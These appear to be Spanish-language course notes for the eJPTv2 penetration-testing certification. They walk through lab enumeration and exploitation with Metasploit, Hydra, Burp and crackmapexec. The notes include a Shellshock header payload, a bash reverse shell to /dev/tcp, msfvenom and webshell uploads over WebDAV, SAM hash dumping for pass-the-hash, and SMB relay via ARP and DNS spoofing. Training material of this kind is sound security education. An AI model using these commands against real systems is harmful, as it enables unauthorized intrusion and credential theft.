![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2041.png)

En este ejemplo, hemos obtenido la contraseña para el usuario “root”. Nos viene bien, porque para el siguiente módulo que vamos a utilizar, necesitamos credenciales.

```bash
use auxiliary/admin/mysql/mysql_enum
set PASSWORD twinkle
set USERNAME root
```

Este módulo nos devuelve mucha información sobre la base de datos, incluida una lista de cuentas con los hashes de las contraseñas. También tenemos información sobre permisos. El siguiente módulo que vamos a utilizar también requiere credenciales. Nos será muy útil, ya que permite ejecutar consultas a la base de datos.

```bash
search mysql_slq
use auxiliary/admin/mysql/mysql_sql
set PASSWORD twinkle
set USERNAME root
set SQL show databases;
```

Para obtener más información del esquema de la base de datos, podemos utilizar el siguiente módulo:

```bash
use auxiliary/scanner/mysql/mysql_schemadump
```

Podemos conectarnos directamente a la base de datos desde la terminal desde el momento en que conseguimos las credenciales. Podemos hacerlo con el siguiente comando:

```bash
mysql -h <IP_target> -u <user_name> -p
```

### Enumeración SSH

Es un protocolo de administración remota (Secure Shell). Utilizado típicamente para conexiones remotas a servidores y sistemas. Corre normalmente en el puerto 22. Vamos a utilizar un módulo de Metasploit para obtener la versión del servicio:

```bash
use auxiliary/scanner/ssh/ssh_version
```

A continuación, usamos el módulo de fuerza bruta para encontrar credenciales:

```bash
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2042.png)

En este ejemplo obtenemos las credenciales ‘sysadmin:hailey’. En este momento ya podríamos acceder a la máquina objetivo vía ssh, pero vamos a acceder desde dentro de Metasploit. Si miramos las sesiones después de ejecutar exitosamente el módulo anterior, vemos que nos aparece una sesión ssh con la máquina objetivo.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2043.png)

Entramos en esa sesión:

```bash
sessions 1
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2044.png)

Activamos una shell con los siguientes comandos y ya estamos conectados a la máquina objetivo.

```bash
/bin/bash -i
```

Cerramos, porque todavía no estamos en la fase de explotación. Vamos a seguir enumerando, esta vez, usuarios.

```bash
use auxiliary/scanner/ssh/ssh_enumusers
```

Si encontramos credenciales durante un ataque de fuerza bruta, conseguiremos una shell robusta, sin necesidad de una sesión meterpreter. Por supuesto, con los permisos que tiene el usuario con el que nos hemos conectado. Realizamos un ataque por fuerza bruta con el siguiente comando:

```bash
hydra -L /common_users.txt -P /unix_passwords.txt <IP_target> -t 4 ssh
# -t 4: Cuatro subprocesos para que vaya más rápido.
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2045.png)

Ahora nos autenticamos y listo:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2046.png)

### Enumeración SMTP

Es un protocolo de comunicación usado para la transmisión de correo electrónico. Usa normalmente el puerto 25, pero puede estar también configurado en los puertos 465 y 587 si se ha configurado un certificado SSL o TLS para el cifrado. Los módulos de Metasploit que vamos a utilizar para enumerar este servicio son:

```bash
use auxiliary/scanner/smpt/smpt_version # Versión del servicio. Ej: Postfix.
use auxiliary/scanner/smtp/smtp_enum    # Enumera usuarios (Fuerza bruta).
```

# Explotación

## Escaneo de vulnerabilidades

### Banner Grabbing

Es una técnica de recopilación de información usada para enumerar información sobre el sistema operativo del objetivo y sobre los servicios que se ejecutan. El objetivo principal es identificar los servicios que están corriendo, sus respectivos puertos y su versión. Esta técnica puede configurarse de varias formas:

- Escaneo de la versión de los servicios con -sV de Nmap.
- Conectarse a puertos abiertos con Netcat.
- Autenticarse en un servicio (SSH, Telnet, FTP, etc.)

Vamos con el ejemplo. Primero escaneamos con Nmap:

```bash
nmap -sV -O <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2047.png)

Ya tenemos puertos abiertos, servicios que corren en ellos y su versión. Vamos a utilizar un script de nmap que se llama **banner.nse**.

```bash
nmap -sV --script=banner <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2048.png)

Esto nos revela la misma información sobre la versión de los servicios en este caso.

Ahora vamos a utilizar **Netcat**. En este ejemplo, sabemos que la máquina objetivo utiliza SSH en el puerto 22. Podemos capturar banners con netcat con el siguiente comando:

```bash
nc <IP_Target> <port>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2049.png)

Nos devuelve información sobre el servicio. Ahora podemos utilizar esta información para buscar exploits. Por ejemplo:

```bash
searchsploit openssh 7.2
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2050.png)

Ahora, como este puerto admite autenticación, podemos capturar el banner también intentando autenticarnos. Nos inventamos unas credenciales e intentamos autenticarnos:

```bash
ssh root@<IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2051.png)

Con SSH sólo obtenemos el mensaje de bienvenida, pero no el banner que nos interesa. Con otros servicios, como Telnet, conseguiríamos más información.

### Escaneo con scripts de NMAP

Para este ejemplo, comenzamos con un escaneo de servicios y sistema operativo de Nmap:

```bash
nmap -sV -O <IP_Target>
```

Vemos, en este caso, que el objetivo tiene un servidor Apache en el puerto 80. En este momento, lo que podemos hacer es intentar acceder con el navegador. 

Vamos a utilizar un script de Nmap, concretamente “http-enum” para obtener más información del servidor:

```bash
nmap -sV --script=http-enum -p 80 <IP_Target>
```

Ahora, vamos a utilizar scripts de nmap para detectar vulnerabilidades. Los buscamos filtrando con el siguiente comando:

```bash
ls /usr/share/nmap/scripts/ | grep vuln
```

Sabemos que nuestro objetivo es vulnerable a Shellshock, así que, vamos a comprobarlo:

```bash
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <IP_Target>
# Argumentos para el script http-shellshock
```

Tenemos la explotación para esta vulnerabilidad en [Shellshock (Linux)](https://www.notion.so/Shellshock-Linux-19a403fef4da80fa9bfdd20d47ebd3e4?pvs=21).

### Escaneo con MSF

Es muy importante obtener la versión del servicio para encontrar las vulnerabilidades correctas. Lo primero que podemos hacer, dentro ya de msfconsole (con la base de datos y el workspace configurados), en lanzar el siguiente comando para escanear el objetivo con Nmap:

```bash
db_nmap -sS -sV -O <IP_target>
```

Todos los resultados se agregarán a la base de datos de msfconsole. Esta información podemos consultarla luego con los comandos “hosts”, “services”, etc. Para buscar vulnerabilidades de un servicio especifico, primero lo hacemos manualmente, buscando módulos para dicho servicio. Por ejemplo, para MySQL:

```bash
search type:exploit name:mysql
```

Si vemos que los exploits disponibles son para versiones anteriores, podemos dejar de buscar por ese camino, ya que los exploits no nos servirán.

Podemos buscar vulnerabilidades directamente en la linea de comandos de la siguiente forma:

```bash
searchsploit “Microsoft Windows SMB” | grep -e “Metasploit”
```

Con el código del exploit, podremos encontrar el módulo en metasploit. Podemos utilizar en Metasploit el comando “analyze” para que nos liste los exploits que pueden ser efectivos en distintos servicios de la máquina objetivo.

Para WebDav hay herramientas especificas que se utiliza desde la línea de comandos, se trata de **davtest** y **cadaver**. Un ejemplo de davtest sería:

```bash
davtest -auth <username>:<pass> -url http://<IP_target>/webdav
```

Un ejemplo de cadaver sería:

```bash
cadaver http://<IP_target>/webdav
```

### Ataques de Fuerza Bruta

Para intentar autenticarnos con el método de fuerza bruta, podemos utilizar la herramienta **Hydra**.

```bash
hydra -L <diccionario_user> -P <diccionario_pass> <IP target> <protocolo> </ruta>
```

Un ejemplo sería:

```bash
hydra -L <diccionario_user> -P <diccionario_pass> <IP target> http-get /webdav/
```

## Análisis de Vulnerabilidades

### EternalBlue (Windows)

CVE-2017-0144. Vulnerabilidad Windows MS17-010 EternalBlue. Se trata de una vulnerabilidad del protocolo SMB. Se ejecuta en la mayoría de sistemas Windows.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2052.png)

Vamos a ver como explotar esta vulnerabilidad. Primero escaneamos con Nmap el puerto 445 de la máquina objetivo.

```bash
nmap -sV -p 445 -O <IP_target>
```

### BlueKeep (Windows)

Es una vulnerabilidad del protocolo RDP en Windows, que permite a los atacantes la ejecución remota de código y acceso al sistema. **CVE-2019-0708**. Los módulos de MSF para explotar esta vulnerabilidad son:

```bash
search BlueKeep
auxiliary/scanner/rdp/cve_2019_0708_bluekeep     # Nos dice si es vulnerable
exploit/windows/rdp/cve_2019_0708_bluekeep_rce   # Ejecución de código remoto
```

En el exploit, hay que especificar la versión del sistema operativo para que funcione correctamente. Para ver las versiones de windows que podemos utilizar:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2053.png)

```bash
set target <Id>
```

Este exploit nos proporciona una sesión meterpreter con permisos de administrador. Hay que tener cuidado con los exploits de kernel, porque pueden bloquear el sistema y ocasionar una pérdida de datos.

### Ataques Pass-the-Hash

Se trata de una técnica de explotación que implica capturar o recolectar hashes o contraseñas en texto sin formato y utilizarlas para autenticarse. Las mejores herramientas para realizar este ataque son:

- **Metasploit PsExec module**.
- **Crackmapexec**.

Esta técnica nos permite obtener acceso al sistema objetivo con credenciales legítimas. Primero vamos a ver cómo utilizar el módulo de Metasploit. Para este ejemplo seguimos los pasos:

- Conseguir acceso para obtener el hash del usuario administrador:

```bash
use exploit/windows/http/badblue_passthru
```

Configuramos RHOSTS y lanzamos el exploit para obtener una sesión meterpreter.

```bash
meterpreter > pgrep lsass # Buscamos el proceso LSASS (devuelve PID)
meterpreter > migrate <lsass_PID> # Migramos al proceso LSASS
meterpreter > getuid # Comprobamos que tenemos permisos de admin
meterpreter > load kiwi
meterpreter > lsa_dump_sam # Volcamos la base de datos SAM.
```

A continuación copiamos el “Hash NTLM” de Administrator y lo guardamos. Podemos guardar también las credenciales de los demás usuarios que nos aparecen.

- Realizar el ataque con el módulo PsExec:

Para poder utilizar este módulo, necesitaremos, además del Hash NTLM, el Hash LM, y una forma rápida de conseguirlo es escribir “**hashdump**” en la sesión meterpreter y nos devuelve el Hash LM (Es el mismo para todos los usuarios, incluido el Administrator). Lo copiamos y lo guardamos. Tiene el siguiente formato:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2054.png)

A continuación, ponemos la sesión meterpreter en segundo plano y buscamos el módulo:

```bash
use exploit/windows/smb/psexec
```

Lo primero que debemos cambiar es LPORT, ya que el 4444 lo estamos utilizando en la sesión meterpreter que tenemos en segundo plano. Lo cambiamos por el puerto 4422 por ejemplo. Debemos indicar también los campos SMBUser (Administrator) y SMBPass (Hash LM). Debemos especificar también el objetivo (escribimos “set target” y nos lista las opciones).

```bash
set LPORT 4422
set SMBUser Administrator
set SMBPass <Hash LM>
set target Native\ upload
exploit
```

- Hemos conseguido una sesión meterpreter para Administrator:

Comprobamos la información del sistema y los permisos:

```bash
meterpreter > sysinfo
meterpreter > getuid
```

Vamos a probar ahora con la herramienta Crackmapexec. Utilizamos el siguiente comando:

```bash
crackmapexec smb <IP_target> -u Administrator -H “<Hash NTLM>”
```

Si nos funciona, probamos el siguiente comando:

```bash
crackmapexec smb <IP_target> -u Administrator -H “<Hash NTLM>” -x "ipconfig"
```

Puede dar algunos errores por problemas con las librerías de Python, pero funciona igualmente. Podemos sustituir “ipconfig” por otros comandos.

### Shellshock (Linux)

Vulnerabilidad de Bash, CVE-2014-6271, de Linux. La razón de que esta vulnerabilidad sea tan peligrosa y crítica, es que permite a un atacante ejecutar comandos arbitrarios de forma remota en el objetivo Linux. Esta explotación involucra 2 servicios: Apache y Bash. Se ejecuta a partir de un script CGI, que se envía al servidor Apache. Estos scripts los utiliza Apache para ejecutar comandos en el sistema Linux y mostrar la salida al cliente. Lo más efectivo es insertar manualmente los comandos en el encabezado HTTP. En este ejemplo, vemos en la máquina objetivo el puerto 80 abierto con Apache corriendo. Si miramos su contenido con el navegador, vemos que tiene una cuenta atrás anunciando el momento en el que la página estará disponible, y esto se trata de un script CGI.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2055.png)

Si inspeccionamos el código, vemos que efectivamente es así:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2056.png)

Si intentamos ver el fichero .cgi en el navegador, simplemente nos aparece la cuenta atrás. Podemos utilizar esa URL como nuestro vector de entrada, en este caso: 

```bash
<IP_Target>/gettime.cgi
```

Sin embargo, debemos comprobar que el servidor es vulnerable a éste ataque, y lo podemos hacer con nmap:

```bash
nmap -sV <IP_Target> —script=http-shellshock —script-args “http-shellshock.uri=/gettime.cgi”
```

Si el sistema es vulnerable, vamos a explotarlo utilizando **Burp Suite**: 

- Modificamos el proxy del navegador para poder interceptar el tráfico con Burp Suite.
- Abrimos Burp Suite y en la pestaña Proxy, pulsamos “Intercept is on” y “Forward”.
- Recargamos en el navegador la URL al recurso .cgi.
- Insertar los caracteres especiales en el encabezado HTTP de User-Agent. Para esto, enviamos la petición al repetidor (click derecho / send to repeater). Luego sustituimos el contenido de User-Agent con el siguiente:

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

- Pulsamos “Send” y vemos la salida del comando “cat” en la sección Response, donde tenemos una lista con todos los usuarios. Ahora podemos introducir otros comandos en ese campo.
- A continuación, vamos a conseguir una shell. Para ello, nos ponemos en escucha con **netcat** en nuestra terminal.

```bash
nc -lvnp 1234
```

- Volvemos a Burp y sustituimos el comando “cat” por el siguiente:

```bash
bash -i>&/dev/tcp/<IP_Local>/1234 0>&1
```

- Pulsamos “Send”, y deberíamos obtener una reverse shell.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2057.png)

Ahora vamos a ver como se explota con **Metasploit**. El módulo para comprobar si el sistema tiene esta vulnerabilidad es:

```bash
use auxiliary/scanner/http/apache_mod_cgi_bash_env
```

Si es vulnerable, utilizamos el siguiente exploit:

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Tenemos que especificar el objetivo (IP y puerto, en este ejemplo, 80), el target URI, que es la localización del fichero .cgi ( /gettime.cgi) y lanzar el exploit.

```bash
set TARGETURI /gettime.cgi
```

Y conseguimos una sesión meterpreter.

### Análisis de vulnerabilidades con WMAP

Se trata de una aplicación para escanear vulnerabilidades de aplicaciones web y se puede usar también para enumeración de servidores web. Está disponible como un plugin de MSF. Para cargar el módulo, simplemente tenemos que introducir el siguiente comando en msfconsole:

```bash
msf5 > load wmap
msf5 > wmap
msf5 > wmap_ # Para ver posibles usos
```

Podemos agregar un nuevo sitio con el siguiente comando:

```bash
wmap_sites -a <IP_Target>
wmap_targets -h # Ayuda
wmap_targets -t <URL_target> # Añade el sitio como objetivo
wmap_sites -l # Comprobamos la lista
```

Podemos utilizar un comando para buscar los módulos que podemos utilizar contra el objetivo:

```bash
wmap_run -h # Ayuda
wmap_run -t # Ver módulos disponibles
wmap_run -e # Comenzamos el escaneo utilizando varios módulos automáticamente
```

Esta herramienta automatiza todo el proceso de enumeración de servidor web. Podemos ver las vulnerabilidades que ha encontrado la herramienta con el siguiente comando:

```bash
wmap_vulns -h # Ayuda
wmap_vulns -l # muestra las vulnerabilidades
```

## Ataques basados en Hosts Windows

Son ataques dirigidos a un sistema específico, con un sistema operativo específico, como Linux o Windows. Se centran primero en explotar vulnerabilidades del SO de objetivo.

### **Microsoft IIS WebDAV**

Este servicio (Internet Information Server) se usa con la familia Windows NT. Proporciona una interfaz gráfica para gestionar los sitios web. WebDAV es un conjunto de extensiones del protocolo HTTP que permite a los usuarios editar y administrar archivos en colaboración en servidores web remotos. Permite que un servidor IIS funcione como un servidor de archivos. Corre en el puerto 80, sin certificado SSL o en el 443 con certificado SSL. 

El primer paso para la explotación es determinar si WebDAV está configurado para correr en el servidor web, aunque el servicio sea Apache, por ejemplo. Podemos realizar ataques de fuerza bruta también, para obtener credenciales. Utilizaremos las herramientas **davtest** y **cadaver**, ambas preinstaladas en kali y parrotOS.

Para acceder a los activos compartidos de webdav, comprobamos el servicio con el script de Nmap “http-enum” para ver si tiene activada la autorización y la ruta en la que se encuentra:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2058.png)

En este ejemplo, se ve que sí se requiere autenticación para acceder, y que se encuentra en la ruta “/webdav/”. Vamos a intentar autenticarnos mediante fuerza bruta con **hydra**.

```bash
hydra -L <Users.txt> -P <Pass.txt> <IP_Target> http-get /webdav/
```

Una vez obtenidas unas credenciales válidas, podemos acceder al directorio compartido desde el navegador. Para escanear el servicio con **davtest**, utilizamos el siguiente comando:

```bash
davtest -url http://<IP_Target>/webdav
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2059.png)

Nos dice que está funcionando, pero no tenemos acceso porque necesitamos autenticarnos. Si tenemos credenciales, introducimos el siguiente comando:

```bash
davtest -auth bob:password_123321 -url http://<IP_Target>/webdav
```

Nos devuelve una lista de archivos que se pueden cargar o ejecutar en el servidor web. Esta información es muy útil, por que a continuación, podemos hacer que el servidor ejecute un fichero que nos proporcione una reverse shell.

Ahora vamos a utilizar **cadaver**. El comando es:

```bash
cadaver http://<IP_Target>/webdav
```

A continuación introducimos las credenciales obtenidas anteriormente. En kali Linux tenemos una serie de **web shells** por defecto y se puede acceder a ellas desde el directorio:

```bash
ls -la /usr/share/webshells/
```

Para este ejemplo, utilizamos las de “asp”, ya que hemos comprobado anteriormente que se puede cargar y ejecutar en el servidor web un fichero con formato .asp:

```bash
ls -la /usr/share/webshells/asp/webshell.asp
```

Así que, en el prompt de **cadaver**, introducimos el siguiente comando para cargar el fichero:

```bash
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

Seguidamente, volvemos al navegador y actualizamos la página para que se nos muestre el contenido real del directorio /webdav. Hacemos click en el fichero que acabamos de cargar para que se ejecute, y se nos abre un recuadro donde podremos introducir y ejecutar comandos que se ejecutan en el servidor.

```bash
dir C:\
type C:\flag.txt
```

Ahora vamos a explotar WebDAV con **Metasploit**. Vamos a generar el payload con la herramienta  **msfvenom**. Utilizamos el siguiente comando:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.5 LPORT=1234 -f asp > shell.asp
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2060.png)

A continuación, accedemos a webdav con **cadaver** y cargamos el fichero que acabamos de crear en el servidor.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2061.png)

Volvemos al navegador y recargamos para comprobar que se ha cargado correctamente.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2062.png)

Ahora, antes de ejecutar el fichero, abrimos **Metasploit** y utilizamos el siguiente módulo:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP_Local>
set LPORT 1234 # El que especificamos en el fichero shell.asp
run
```

En este punto, Metasploit queda en espera hasta que ejecutemos el fichero shell.asp en el servidor. Para ello, vamos al navegador y hacemos click en él.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2063.png)

### **Explotación de SMB con PsExec**

La comunicación entre cliente y servidor para una operación de autenticación en un servicio SMB tiene los siguientes pasos:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2064.png)

PsExec es un servicio que reemplaza a telnet. La autenticación se realiza a través de SMB y permite ejecutar comandos en una máquina Windows remota. Antes de utilizar este servicio debemos obtener credenciales legítimas. Para ello, utilizaremos fuerza bruta. En Windows, sabemos que siempre habrá un usuario “Administrator”, así que, vamos a tiro fijo.

Primero, iniciamos Metasploit y utilizamos el siguiente módulo:

```bash
use auxiliary/scanner/smb/smb_login
set SMBUser administrator
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
```

Una vez obtenidas las credenciales, vamos a autenticarnos con el siguiente comando:

```bash
[psexec.py](http://psexec.py) Administrator@<IP_Target> cmd.exe
```

Podemos utilizar psexec directamente desde msfconsole:

```bash
use exploit/windows/smb/psexec
```

Especificamos las credenciales (SMBUser y SMBPass) y listo, tenemos una sesión meterpreter.

### Explotación de RDP

RDP (Remote Desktop Protocol) proporciona un acceso remoto con interfaz gráfica para microsoft, para interactuar remotamente con un sistema Windows. Usa el puerto 3389 por defecto. Requiere autenticación.

Si vemos que en un escaneo con Nmap no nos sale el puerto 3389 abierto, pero tenemos el 3333 y no nos muestra versión del servicio, podemos comprobar si en ese puerto está corriendo RDP de la siguiente forma con un módulo de Metasploit:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2065.png)

```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <IP_Target>
set RPORT <port>
run
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2066.png)

Este módulo nos confirma si está corriendo RDP en ese puerto. Ahora realizamos un ataque de fuerza bruta con Hydra:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP_Target> -s <RDP_Port> 
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2067.png)

Una ver encontramos credenciales, nos autenticamos:

```bash
xfreerdp /u:<username> /p:<pass> /v:<IP_Target>:<port>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/c9e60940-479f-4de1-b200-c88e7b4019a1.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/4dcb3d52-3c30-4058-9ba4-56c0020699b2.png)

### Explotación BlueKeep

CVE-2019-0708 RDP Vulnerability. Se trata de una vulnerabilidad RDP, que, explotándola, podremos obtener una sesión meterpreter. Permite ejecución remota con permisos de administrador y sin autenticación, ya que el atacante puede acceder a una parte de la memoria del Kernel, donde ejecutará el código malicioso. 

Para la explotación, primero verificamos si corre RDP en el sistema objetivo, y comprobamos si es vulnerable con el siguiente módulo de Metasploit:

```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

Sólo necesitamos configurar RHOSTS, y tras ejecutarlo, nos indica si el servicio es vulnerable. Si este es el caso, utilizamos el siguiente módulo para explotar la vulnerabilidad, teniendo en cuenta que este módulo sólo funciona con versiones de 64 bits:

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

Antes de lanzarlo, debemos establecer la versión de Windows que corre en el objetivo:

```bash
show targets # Muestra las versiones que se pueden configurar en este módulo.
```

Después de ejecutarlo, obtendremos una sesión meterpreter.

### Explotación WinRM

WinRM (Windows Remote Management) es un protocolo de gestión remota de Windows que facilita el acceso a sistemas con este SO sobre HTTP(S). No está configurado por defecto, hay que hacerlo manualmente. Usa por defecto el puerto 5985 (http) y 5986 (https).

Este servicio implementa control de acceso para la comunicación entre sistemas a través de varios formularios. Podemos utilizar **Crackmapexec** para realizar un ataque de fuerza bruta para encontrar credenciales y poder ejecutar comandos en el sistema objetivo. Si queremos obtener una shell inversa, tenemos que utilizar la herramienta **evil-winrm.rb**, que no sólo sirve para buscar credenciales, si no que también nos proporciona una shell.

Lo primero que haremos será comprobar en que puerto corre el servicio. Los puertos en los que corre por defecto, no están entre los 1000 que escanea Nmap por defecto, así que, o bien hacemos un escaneo de todos los puertos, o escaneamos directamente los puertos 5985 y 5986.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2068.png)

Ahora vamos a conseguir credenciales con Crackmapexec:

```bash
crackmapexec winrm <IP_Target> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Una vez tengamos la contraseña de administrador, podemos ejecutar comandos en el sistema objetivo:

```bash
crackmapexec winrm <IP_Target> -u administrator -p <pass> -x "whoami"
```

Para obtener una shell utilizaremos **evil-winrm.rb**:

```bash
evil-winrm.rb -u administrator -p <pass> -i <IP_target>
```

Si queremos hacerlo con **Metasploit**, utilizamos el siguiente módulo:

```bash
use exploit/windows/winrm/winrm_script_exec
```

Para este ejemplo configuramos a true la opción FORCE_VBS para obligar al módulo a usar un comando de visual basic stager. Además, debemos establecer el USERNAME y PASSWORD. Una vez finalizada la ejecución, obtenemos una sesión meterpreter.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2069.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2070.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2071.png)

## Ataques Basados en Redes

### SMB Relay Attack (Windows)

En este ataque de red, el atacante intercepta tráfico SMB, lo manipula, y lo transmite a un servidor legítimo para obtener acceso no autorizado a los recursos o realizar acciones maliciosas. Los pasos a seguir durante este ataque son los siguientes:

- **Interceptación**. man-in-the-middle con ARP spoofing, DNS poisoning o la configuración de un SMB no autorizado.
- **Captura autenticación**. Cuando un cliente se conecta al servidor via SMB, se envían datos de autenticación. El atacante los captura (hashes NTLM).
- **Reenvío al servidor**. En lugar de desencriptar el hash, el atacante lo transmite a otro servidor que confía en la fuente, esto permite al atacante hacerse pasar por el usuario cuyo hash ha capturado en el paso anterior.
- **Ganar Acceso**. Si la retransmisión tiene éxito, el atacante puede obtener acceso a los recursos del servidor.

Vamos con el ejemplo.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2072.png)

Vamos a configurar este ataque utilizando un módulo de Metasploit:

```bash
use exploit/windows/smb/smb_relay
set SRVHOST <IP_atacante>
set LHOST <IP_atacante>
set SMBHOST <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2073.png)

Ahora vamos a necesitar configurar una suplantación de DNS para redirigir a la víctima a nuestro sistema Kali cada vez que haya una conexión SMB a cualquier host en el dominio. En este caso el dominio lo hacemos como .com. Entonces, abrimos una terminal nueva y comenzamos creando un archivo que emula un archivo que contiene registros DNS. Lo hacemos de la siguiente forma:

```bash
echo "<IP_atacante> *.sportsfoo.com" > dns
# Indica que la IP atacante puede resolver cualquier dominio .sportsfoo.com
# Es el dominio del servidor que nos interesa.
```

Ahora vamos a usar DNS spoof a través de nuestra interface eth1 y el archivo que contiene el registro DNS. Esto, con el archivo DNS falso que hemos creado, nos permitirá saber dónde se encuentran todas las solicitudes .sportsfood. Para esto, introducimos el siguiente comando:

```bash
dnsspoof -i eth1 -f dns
```

Esto queda a la escucha en la interfaz eth1.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2074.png)

Ahora ya podemos preparar el ataque **man-in-the-middle**, y utilizaremos operaciones de suplantación de identidad para envenenar el tráfico entre nuestra víctima (Windows 7) y la puerta de enlace. Esto nos permite manipular el tráfico que utiliza **dnsspoof**. Estamos listos para realizar el ataque de suplantación de operaciones. En una nueva terminal habilitamos el reenvío de IP:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

En esta misma terminal escribimos el siguiente comando:

```bash
arpspoof -i eth1 -t <IP_Cliente (Windows7)> <IP_PuertaEnlace>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2075.png)

En una nueva terminal, vamos a informar de que las operaciones fallan contra la puerta de enlace real:

```bash
arpspoof -i eth1 -t <IP_PuertaEnlace> <IP_Cliente (Windows7)>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2076.png)

Lo que sucede ahora, es que cada vez que la víctima (Windows 7) inicia una conexión SMB, dnsspoof se alinea con el ataque de ARP Spoofing, falsificando las respuestas DNS, diciendo que los sistemas a los que se dirige la dirección DNS, los resuelve nuestro sistema Kali. 

Ahora vamos a la terminal que teníamos con Metasploit y lanzamos el exploit para el siguiente paso.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2077.png)

Si vamos a la terminal en la que tenemos en escucha a dnsspoof, deberíamos comenzar a ver solicitudes de subdominios específicos, o sólo solicitudes del dominio. 

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2078.png)

En este momento, ya tendremos creada una sesión meterpreter en Metasploit con acceso al servidor y con privilegios elevados.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2079.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2080.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2081.png)

## Exploits

### Cross-Compiling Exploits

La compilación cruzada de exploits consiste en compilar exploits de Linux para Windows, por ejemplo.

Si el código del exploit está escrito en Python, no necesitamos hacer nada, pero si está en C, C++, etc. para ejecutarlo en Linux deberemos compilar el exploit en un binario o en un ejecutable portable (Windows).

Vamos con el ejemplo. Vamos a necesitar la herramienta **mingw-w64**:

```bash
sudo apt-get install mingw-w64
```

Esta herramienta es para compilar para Linux. Para Windows, se utiliza el compilador GNU, que ya viene instalado por defecto en Kali. Aún así, se puede instalar con el siguiente comando, y de ser preciso, se nos actualizará:

```bash
sudo apt-get install gcc
```

Vamos a compilar el exploit para Windows primero. Se trata de un exploit para VLC Media Player 0.8.6f, que está escrito en C. Podremos compilar una versión de 32bits o una de 64bits. Es recomendable compilar para 32bits, ya que será compatible también con 64bits.

Este exploit podemos descargarlo directamente de “exploitDB”, o copiar el código directamente. Lo tenemos también buscando con “searchsploit VideoLAN VLC” en /windows/remote/9303.c.

```bash
searchsploit -m 9303.c
```

En el código de los exploits, en los comentarios, puede haber información sobre cómo compilarlo, argumentos necesarios y demás. Vamos a compilarlo para la versión de 64bits:

```bash
i686-w64-mingw32-gcc 9303.c -o exploit
# -o exploit le dá el nombre "exploit" al fichero compilado
```

Tendremos como resultado un fichero exploit.exe. Así es como se hace la compilación cruzada para Windows en Linux. Ahora vamos a compilar la versión 32bits:

```bash
i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
# -lws2_32 indica que queremos la versión de 32bits
```

